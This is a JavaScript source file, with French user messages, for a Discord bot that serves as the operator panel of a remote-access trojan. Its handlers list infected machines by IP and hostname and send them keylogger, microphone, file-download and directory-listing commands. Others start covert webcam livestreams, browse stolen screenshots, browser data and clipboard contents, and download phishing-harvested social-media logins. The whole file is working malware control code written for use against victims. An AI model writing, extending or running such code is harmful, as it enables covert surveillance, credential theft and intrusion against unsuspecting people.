import {ActionRowBuilder, AttachmentBuilder, ButtonBuilder} from "discord.js";
import {commands} from "../commands.js";
import {executeRequestWithTokenRefresh} from "./token.js";
import {createEmbed} from "./utils.js";
import config from "../static/config.json" assert {type: "json"};

const {API_BASE_URL} = config;

export const handleHelpCommand = async (interaction) => {
    await interaction.deferReply({ephemeral: true});
    const embed = createEmbed('Aide', 'Voici la liste des commandes disponibles :', commands.map(command => ({
        name: `/${command.name}`,
        value: command.description,
    })));
    await interaction.editReply({embeds: [embed]});
};

export const handleClientsCommand = async (interaction) => {
    await interaction.deferReply({ephemeral: true});

    const statusFilter = interaction.options.getString('status');
    const url = `${API_BASE_URL}/clients/${statusFilter ? `?status=${statusFilter}` : ''}`;

    try {
        const response = await executeRequestWithTokenRefresh(url);
        const clients = response.data;

        if (clients.length === 0) {
            await interaction.editReply("Aucun client disponible.");
            return;
        }
        const embeds = clients.map(client => createEmbed(`Client ${client.id || 'Client sans nom'} / ${client.ip}`,
            `**OS :** ${client.os}\n` +
            `**Version :** ${client.os_version}\n` +
            `**Hostname :** ${client.hostname}\n` +
            `**Créé le :** ${client.date_created}\n` +
            `**Mis à jour le :** ${client.date_updated}\n` +
            `**Statut :** ${client.status.toUpperCase()}`,
            [],
            client.status === 'online' ? '#00FF00' : '#FF0000'
        ));

        await interaction.editReply({embeds});
    } catch (error) {
        console.error("Erreur lors de la récupération des clients", error);
        await interaction.editReply("Erreur lors de la récupération des clients.");
    }
};

export const handleSendCommand = async (interaction) => {
    const clientId = interaction.options.getString('client_id');
    const command = interaction.options.getString('command');
    const duration = interaction.options.getInteger('duration') || 10;
    const file_path = interaction.options.getString('file_path');
    const user_id = interaction.user.id;

    await interaction.deferReply({ephemeral: true});

    const url = `${API_BASE_URL}/command/${clientId}`;
    let data = {
        command: command,
        user_id: user_id,
    };

    if ((command === 'microphone' || command === 'keylogger') && duration) {
        data.params = {duration};
    } else if ((command === 'microphone' || command === 'keylogger') && !duration) {
        await interaction.editReply(`La durée est requise pour la commande '${command}'.`);
        return;
    }

    if (command === 'downloadfile' && file_path) {
        data.params = {file_path};
    } else if (command === 'downloadfile' && !file_path) {
        await interaction.editReply(`Le chemin du fichier est requis pour la commande '${command}'.`);
        return;
    }

    try {
        await executeRequestWithTokenRefresh(url, {method: 'POST', data});
        if (command === 'microphone' || command === 'keylogger') {
            const contentType = command === 'microphone' ? 'de l\'audio' : 'du clavier';
            await interaction.editReply(`Démarrage de l'enregistrement ${contentType} pour le client ${clientId} pour ${duration} secondes...`);
            let elapsedSeconds = 0;
            const intervalId = setInterval(async () => {
                elapsedSeconds++;
                const percentage = Math.min((elapsedSeconds / duration) * 100, 100).toFixed(0);
                await interaction.editReply(`Enregistrement en cours... ${percentage}% complété.`);
                if (elapsedSeconds >= duration) {
                    clearInterval(intervalId);
                    await interaction.editReply(`Enregistrement terminé pour le client ${clientId}.`);
                }
            }, 1000);
        } else {
            await interaction.editReply(`Commande '${command}' envoyée au client ${clientId}.`);
        }
    } catch (error) {
        if (error.response.data.message.includes("hors ligne")) {
            await interaction.editReply("Le client est hors ligne.");
        } else {
            console.error("Erreur lors de l'envoi de la commande", error);
            await interaction.editReply("Erreur lors de l'envoi de la commande.");
        }
    }
};

export const handleLivestreamCommand = async (interaction) => {
    const clientId = interaction.options.getString('client_id');
    await interaction.deferReply({ephemeral: true});

    const url = `${API_BASE_URL}/webcam/link/${clientId}`;
    const url_webcam = `${API_BASE_URL}/webcam/${clientId}`;
    try {
        await executeRequestWithTokenRefresh(url, {method: 'GET'});
        await interaction.editReply(`Diffusion en direct de la webcam du client ${clientId} démarrée : ${url_webcam}`);
    } catch (error) {
        if (error.response.data.message.includes("hors ligne")) {
            await interaction.editReply("Le client est hors ligne.");
        } else {
            console.error("Erreur lors du démarrage de la diffusion en direct : ", error.response.data.message);
            await interaction.editReply(error.response.data.message);
        }
    }
}

export const handleStopLivestreamCommand = async (interaction) => {
    const clientId = interaction.options.getString('client_id');
    await interaction.deferReply({ephemeral: true});

    const url = `${API_BASE_URL}/webcam/stop/${clientId}`;
    try {
        await executeRequestWithTokenRefresh(url, {method: 'GET'});
        await interaction.editReply(`Diffusion en direct de la webcam du client ${clientId} arrêtée.`);
    } catch (error) {
        if (error.response.data.message.includes("hors ligne")) {
            await interaction.editReply("Le client est hors ligne.");
        } else {
            console.error("Erreur lors de l'arrêt de la diffusion en direct : ", error.response.data.message);
            await interaction.editReply(error.response.data.message);
        }
    }
}

export const handleListDataCommand = async (interaction) => {
    const type = interaction.options.getString('type');
    const browser = interaction.options.getString('browser') || null;
    await interaction.deferReply({ephemeral: true});

    try {
        const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/clients/`);
        const clients = response.data;

        if (clients.length === 0) {
            await interaction.editReply("Aucun client disponible.");
            return;
        }

        const buttons = clients.map(client =>
            new ButtonBuilder()
                .setCustomId(`${type}_${client.id}_${browser}`)
                .setLabel(`Client ${client.id || 'Client sans nom'} / ${client.ip}`)
                .setStyle(1)
        );

        const components = [];
        for (let i = 0; i < buttons.length; i += 5) {
            const actionRow = new ActionRowBuilder().addComponents(buttons.slice(i, i + 5));
            components.push(actionRow);
        }

        let content = '';
        switch (type) {
            case 'screenshot':
                content = "Sélectionnez un client pour voir les captures d'écran :";
                break;
            case 'microphone':
                content = "Sélectionnez un client pour voir les enregistrements audio :";
                break;
            case 'browserdata':
                content = "Sélectionnez un client pour voir les données de navigation :";
                break;
            case 'keylogger':
                content = "Selectionner un client pour voir les enregistrements du clavier :";
                break;
            case 'clipboard':
                content = "Selectionner un client pour voir les presses récupérées :";
                break;
            case 'downloadfile':
                content = "Selectionner un client pour voir les fichiers téléchargés :";
                break;

        }

        await interaction.editReply({content, components});

    } catch (error) {
        console.error("Erreur lors de la récupération des clients", error);
        await interaction.editReply("Erreur lors de la récupération des clients.");
    }
}

export const handleListDirectoriesClientCommand = async (interaction) => {
    const clientId = interaction.options.getString('client_id');
    const dir_path = interaction.options.getString('dir_path');
    const user_id = interaction.user.id;
    let title = '';
    await interaction.deferReply({ephemeral: true});

    const url = `${API_BASE_URL}/directory/client/${clientId}`;
    try {
        const response = await executeRequestWithTokenRefresh(url, {method: 'POST', data: {dir_path, user_id}});
        const directories_and_files = response.data;
        directories_and_files.map(item => {
            title = item.path + '/'
        });

        if (directories_and_files.length === 0) {
            await interaction.editReply("📁 Aucun répertoire trouvé pour ce client.");
            return;
        }

        const itemsPerPage = 10;
        let currentPage = 0;
        const totalPages = Math.ceil(directories_and_files.length / itemsPerPage);

        const generateEmbed = (page) => {
            const start = page * itemsPerPage;
            const end = start + itemsPerPage;
            const embedDescription = directories_and_files.slice(start, end).map(item => {
                if (item.type === 'dir') {
                    return `📂 **${item.name}**`;
                } else if (item.type === 'file') {
                    return `📄 **${item.name}**`;
                }
            }).join('\n\n');

            return createEmbed(
                `Contenu du client ${clientId} - "${title}" (Page ${page + 1}/${totalPages})`,
                embedDescription,
                [],
                '#024b7a'
            );
        };

        const embed = generateEmbed(currentPage);

        const previousButton = new ButtonBuilder()
            .setCustomId('previous')
            .setLabel('Précédent')
            .setStyle(1)
            .setDisabled(currentPage === 0);

        const nextButton = new ButtonBuilder()
            .setCustomId('next')
            .setLabel('Suivant')
            .setStyle(1)
            .setDisabled(currentPage === totalPages - 1);

        const components = [new ActionRowBuilder().addComponents(previousButton, nextButton)];

        await interaction.editReply({embeds: [embed], components});

        const message = await interaction.fetchReply();
        const filter = i => ['previous', 'next'].includes(i.customId) && i.user.id === interaction.user.id;
        const collector = message.createMessageComponentCollector({filter, time: 60000});

        collector.on('collect', async i => {
            if (i.customId === 'next' && currentPage < totalPages - 1) {
                currentPage++;
            } else if (i.customId === 'previous' && currentPage > 0) {
                currentPage--;
            }

            const newEmbed = generateEmbed(currentPage);

            const newPreviousButton = new ButtonBuilder()
                .setCustomId('previous')
                .setLabel('Précédent')
                .setStyle(1)
                .setDisabled(currentPage === 0);

            const newNextButton = new ButtonBuilder()
                .setCustomId('next')
                .setLabel('Suivant')
                .setStyle(1)
                .setDisabled(currentPage === totalPages - 1);

            const newComponents = [new ActionRowBuilder().addComponents(newPreviousButton, newNextButton)];

            await i.update({embeds: [newEmbed], components: newComponents});
        });

        collector.on('end', async () => {
            try {
                await interaction.editReply({content: 'La pagination a expiré.', components: []});
            } catch (error) {
                if (error.code !== 10008) { // Ignore "Unknown Message" errors
                    console.error("Erreur lors de la suppression des composants", error);
                }
            }
        });
    } catch (error) {
        console.error("Erreur lors de la récupération des répertoires", error);
        await interaction.editReply("Erreur lors de la récupération des répertoires.");
    }
};

export async function handleGetLoginDataCommand(interaction) {
    await interaction.deferReply({ephemeral: true});

    const url = `${API_BASE_URL}/phishing/login_data`;
    try {
        const response = await executeRequestWithTokenRefresh(url, {method: 'GET', responseType: 'arraybuffer'});
        let buffer = Buffer.from(response.data, 'utf-8');
        const attachment = new AttachmentBuilder(buffer, {name: 'login_data.txt'});
        await interaction.editReply({content: 'Voici les données de connexion des réseaux sociaux :', files: [attachment]});

    } catch (error) {
        console.error("Erreur lors de la récupération des données de connexion", error);
        await interaction.editReply("Erreur lors de la récupération des données de connexion.");
    }
}
